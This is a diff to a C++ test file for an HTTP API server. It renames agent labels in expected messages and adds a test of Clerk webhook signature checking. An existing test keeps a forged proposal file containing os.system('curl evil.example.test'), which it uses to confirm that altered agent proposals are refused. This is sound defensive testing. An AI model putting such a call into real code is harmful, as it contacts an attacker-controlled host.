@@ -47,6 +47,7 @@
 
 #include "api/route_guard.hpp"
 #include "lake/api/capabilities.hpp"
+#include "lake/api/clerk_webhooks.hpp"
 #include "lake/api/oauth.hpp"
 #include "lake/api/server.hpp"
 #include "lake/audit/audit.hpp"
@@ -1523,7 +1524,7 @@ TEST_P(HttpResponseIsolation, AskOramaSaysWhoIsWorkingOnALongTurn) {
     EXPECT_FALSE(working["task"]["created_at"].get<std::string>().empty())
         << "how long it has worked";
 
-    // Ask Orama brings in Auto-Suggest with its turn key; the asking turn reports it.
+    // Ask Orama brings in the Auto-Suggest Agent with its turn key; the asking turn reports it.
     const std::string delegated = connection->request(
         "POST", "/v1/agent_turn",
         nlohmann::json{{"customer_id", customer_id},
@@ -1540,9 +1541,9 @@ TEST_P(HttpResponseIsolation, AskOramaSaysWhoIsWorkingOnALongTurn) {
     EXPECT_EQ(store_->get_agent_task(child)->parent_task_id, task) << "routing stays central";
     EXPECT_EQ(store_->get_agent_task(task)->message, "") << "the report is in the workspace";
     EXPECT_EQ(assembled_task(task)->message,
-              "Ask Orama asked Auto-Suggest: What is worth building?");
+              "Ask Orama asked Auto-Suggest Agent: What is worth building?");
     EXPECT_EQ(turn(conversation, task)["task"]["message"],
-              "Ask Orama asked Auto-Suggest: What is worth building?");
+              "Ask Orama asked Auto-Suggest Agent: What is worth building?");
 
     ASSERT_EQ(bus("agent-autosuggest", "/v1/claim_agent_task",
                   {{"task_id", child}, {"agent", "agent-autosuggest"}})["ok"],
@@ -1551,7 +1552,7 @@ TEST_P(HttpResponseIsolation, AskOramaSaysWhoIsWorkingOnALongTurn) {
                   {{"task_id", child}, {"agent", "agent-autosuggest"}, {"type", "progress"},
                    {"message", "Reading 4 datasets"}})["ok"],
               true);
-    EXPECT_EQ(turn(conversation, task)["task"]["message"], "Auto-Suggest: Reading 4 datasets")
+    EXPECT_EQ(turn(conversation, task)["task"]["message"], "Auto-Suggest Agent: Reading 4 datasets")
         << "the subagent's progress shows on the person's turn";
     bool published = false;
     for (const auto& [name, read, input] : workspace_caller_->calls) {
@@ -1559,7 +1560,7 @@ TEST_P(HttpResponseIsolation, AskOramaSaysWhoIsWorkingOnALongTurn) {
             const nlohmann::json event = nlohmann::json::parse(input.value("payload", std::string("{}")));
             published = published || (event.value("delegated_task_id", std::string()) == child &&
                                        event.value("message", std::string()) ==
-                                           "Auto-Suggest: Reading 4 datasets");
+                                           "Auto-Suggest Agent: Reading 4 datasets");
         }
     }
     EXPECT_TRUE(published) << "the asking turn's progress is on the workspace's agent-events";
@@ -1569,7 +1570,7 @@ TEST_P(HttpResponseIsolation, AskOramaSaysWhoIsWorkingOnALongTurn) {
                    {"result", {{"ok", true}, {"reply", "Churn"}}}})["ok"],
               true);
     EXPECT_EQ(turn(conversation, task)["task"]["message"],
-              "Auto-Suggest finished; writing the answer.");
+              "Auto-Suggest Agent finished; writing the answer.");
     ASSERT_EQ(bus("agent-ask-orama", "/v1/publish_agent_event",
                   {{"task_id", task}, {"agent", "agent-ask-orama"}, {"type", "result"},
                    {"result", {{"ok", true}, {"reply", "Build churn."}}}})["ok"],
@@ -1586,7 +1587,7 @@ TEST_P(HttpResponseIsolation, AskOramaSaysWhoIsWorkingOnALongTurn) {
     EXPECT_EQ(messages[1]["content"], "Build churn.");
 }
 
-// Discover (lake#269, lake#376): Auto-Suggest scans in the background, its Opportunities are kept
+// Discover (lake#269, lake#376): Auto-Suggest Agent scans in the background, its Opportunities are kept
 // in the workspace, a chosen one becomes a project, and the Project Agent's design is applied to it
 // once, wherever its task is read.
 TEST_P(HttpResponseIsolation, DiscoverOpportunitiesScansAndCreatesProjects) {
@@ -1641,7 +1642,7 @@ TEST_P(HttpResponseIsolation, DiscoverOpportunitiesScansAndCreatesProjects) {
                  {"kind", "discover"},
                  {"message", "What could this workspace build from its data?"}});
     ASSERT_TRUE(scanned.value("ok", false)) << scanned_response.substr(0, 300);
-    EXPECT_TRUE(agents_->turns.empty()) << "the request never waits on Auto-Suggest";
+    EXPECT_TRUE(agents_->turns.empty()) << "the request never waits on the Auto-Suggest Agent";
     const std::string task = scanned["value"]["task_id"];
     ASSERT_FALSE(task.empty());
     EXPECT_EQ(get_v1(*connection,
@@ -1650,7 +1651,7 @@ TEST_P(HttpResponseIsolation, DiscoverOpportunitiesScansAndCreatesProjects) {
               "pending");
     run_agent_task(*connection, task);
     EXPECT_FALSE(agents_->turns.back().contains("profile"))
-        << "Auto-Suggest builds the profile itself with its read-only credential";
+        << "Auto-Suggest Agent builds the profile itself with its read-only credential";
     EXPECT_FALSE(agents_->turns.back()["zetta_token"].get<std::string>().empty());
 
     const auto found =
@@ -1914,7 +1915,7 @@ TEST_P(HttpResponseIsolation, ShipAppsCreatesOperatesAndFollowsAnApp) {
     select_workspace(*connection, customer_id);
     const std::string workspace_id = connection->workspace_id;
     const std::string scope = "customer_id=" + customer_id + "&workspace_id=" + workspace_id;
-    // An ApplicationAgent turn as Ship > Apps sends it.
+    // An Application Agent turn as Ship > Apps sends it.
     const auto turn = [&](nlohmann::json input) {
         input["customer_id"] = customer_id;
         input["workspace_id"] = workspace_id;
@@ -2017,7 +2018,7 @@ TEST_P(HttpResponseIsolation, ShipAppsCreatesOperatesAndFollowsAnApp) {
             proposal,
             true,
             "400",
-            "That task has no ApplicationAgent proposal to confirm.");
+            "That task has no Application Agent proposal to confirm.");
     nlohmann::json forged = proposal;
     forged["files"][0]["contents"] = "import os\nos.system('curl evil.example.test')\n";
     refused(proposal_task,
@@ -2025,19 +2026,19 @@ TEST_P(HttpResponseIsolation, ShipAppsCreatesOperatesAndFollowsAnApp) {
             forged,
             true,
             "409",
-            "The ApplicationAgent proposal changed before confirmation.");
+            "The Application Agent proposal changed before confirmation.");
     refused(proposal_task,
             lake::api::agent_proposal_digest(forged),
             forged,
             true,
             "409",
-            "The ApplicationAgent proposal changed before confirmation.");
+            "The Application Agent proposal changed before confirmation.");
     refused(proposal_task,
             std::string(64, '0'),
             proposal,
             true,
             "409",
-            "The ApplicationAgent proposal changed before confirmation.");
+            "The Application Agent proposal changed before confirmation.");
     refused(proposal_task, proposal_sha, proposal, false, "400", "This app will be public.");
     EXPECT_EQ(bus_->events("agent-tasks.agent-application").size(), tasks_before)
         << "no turn starts for a refused confirmation";
@@ -2292,7 +2293,7 @@ TEST_P(HttpResponseIsolation, ExperimentsAgentRestAndMcpUseTheSameConfirmedTurn)
         const auto [stale_response, stale] = confirm(sha, confirmed);
         EXPECT_TRUE(stale_response.starts_with("HTTP/1.1 409")) << stale_response;
         EXPECT_EQ(stale["error"]["message"],
-                  "The ExperimentsAgent proposal changed before confirmation.");
+                  "The Experiments Agent proposal changed before confirmation.");
     }
     nlohmann::json unedited = reviewed;
     unedited["study"] = "not an object";
@@ -2352,7 +2353,7 @@ TEST_P(HttpResponseIsolation, TheAgentFactoryCreatesOnlyTheExactProposalThePerso
         {"files",
          nlohmann::json::array({{{"path", "agent/tools.py"}, {"contents", "TOOLS = []\n"}}})},
         {"secret_mount", ""}};
-    // AgentCreator answers words for the person and the structured answer beside them
+    // Agent Creator Agent answers words for the person and the structured answer beside them
     // (agent-creator#1).
     agents_->answer = {
         {"ok", true},
@@ -2362,7 +2363,7 @@ TEST_P(HttpResponseIsolation, TheAgentFactoryCreatesOnlyTheExactProposalThePerso
     const auto [sent_response, sent] = call(
         "send_ask_message", {{"kind", "factory"}, {"message", "an agent that flags renewals"}});
     ASSERT_TRUE(sent.value("ok", false)) << sent_response.substr(0, 300);
-    // AgentCreator works in the background (lake#269).
+    // Agent Creator Agent works in the background (lake#269).
     EXPECT_TRUE(agents_->turns.empty());
     const std::string conversation = sent["value"]["conversation_id"];
     const std::string task = sent["value"]["task_id"];
@@ -3335,6 +3336,75 @@ TEST(HttpServer, ClerkSessionExchangeIsAbsentWithoutClerk) {
     EXPECT_TRUE(connection.request("POST", "/identity/clerk-session", "token=x")
                     .starts_with("HTTP/1.1 404"));
     EXPECT_EQ(response_header(connection.request("POST", "/logout"), "location"), "/");
+}
+
+// Clerk's user events (lake#765): the route exists only with LAKE_CLERK_WEBHOOK_SECRET, takes
+// Svix's headers and answers 401 to a forged delivery.
+TEST(HttpServer, ClerkWebhookIsSignedAndAbsentWithoutItsSecret) {
+    const std::string secret = "whsec_bGFrZSBjbGVyayB3ZWJob29rIHRlc3Qgc2VjcmV0ISE=";
+    const std::string body =
+        R"({"type":"user.created","object":"event","data":{"id":"user_http","first_name":"H",)"
+        R"("primary_email_address_id":"idn_1","email_addresses":[{"id":"idn_1",)"
+        R"("email_address":"http-hook@example.test","verification":{"status":"verified"}}]}})";
+    const std::string timestamp =
+        std::to_string(std::chrono::duration_cast<std::chrono::seconds>(
+                           std::chrono::system_clock::now().time_since_epoch())
+                           .count());
+    lake::api::clerk_webhooks::Delivery delivery{"msg_http", timestamp, "", body};
+    const std::vector<std::pair<std::string, std::string>> headers = {
+        {"svix-id", "msg_http"},
+        {"svix-timestamp", timestamp},
+        {"svix-signature", "v1," + lake::api::clerk_webhooks::sign(secret, delivery)}};
+    {
+        lake::api::ServerOptions options;
+        options.port = 0;
+        options.worker_coroutines = 1;
+        options.instance_kek = "clerk-webhook-off-kek";
+        options.store = std::make_shared<lake::control::InMemoryStore>();
+        lake::api::ApiServer server(options);
+        ASSERT_TRUE(server.start()) << server.reason();
+        HttpConnection connection(server.port());
+        EXPECT_TRUE(connection
+                        .request("POST",
+                                 "/identity/clerk-webhook",
+                                 body,
+                                 {},
+                                 "HTTP/1.1",
+                                 {},
+                                 "application/json",
+                                 headers)
+                        .starts_with("HTTP/1.1 404"));
+    }
+    lake::api::ServerOptions options;
+    options.port = 0;
+    options.worker_coroutines = 1;
+    options.instance_kek = "clerk-webhook-on-kek";
+    options.clerk_webhook_secret = secret;
+    auto store = std::make_shared<lake::control::InMemoryStore>();
+    options.store = store;
+    lake::api::ApiServer server(options);
+    ASSERT_TRUE(server.start()) << server.reason();
+    HttpConnection connection(server.port());
+    auto forged = headers;
+    forged[2].second = "v1,AAAA";
+    EXPECT_TRUE(connection
+                    .request("POST",
+                             "/identity/clerk-webhook",
+                             body,
+                             {},
+                             "HTTP/1.1",
+                             {},
+                             "application/json",
+                             forged)
+                    .starts_with("HTTP/1.1 401"));
+    const std::string accepted = connection.request(
+        "POST", "/identity/clerk-webhook", body, {}, "HTTP/1.1", {}, "application/json", headers);
+    ASSERT_TRUE(accepted.starts_with("HTTP/1.1 200")) << accepted;
+    EXPECT_EQ(nlohmann::json::parse(response_body(accepted)).at("created"), true);
+    const auto users = store->list_users(10);
+    ASSERT_TRUE(users);
+    EXPECT_TRUE(std::ranges::any_of(
+        *users, [](const auto& row) { return row.email == "http-hook@example.test"; }));
 }
 
 TEST(HttpServer, IdleKeepAliveCloseWritesNothingToStderr) {
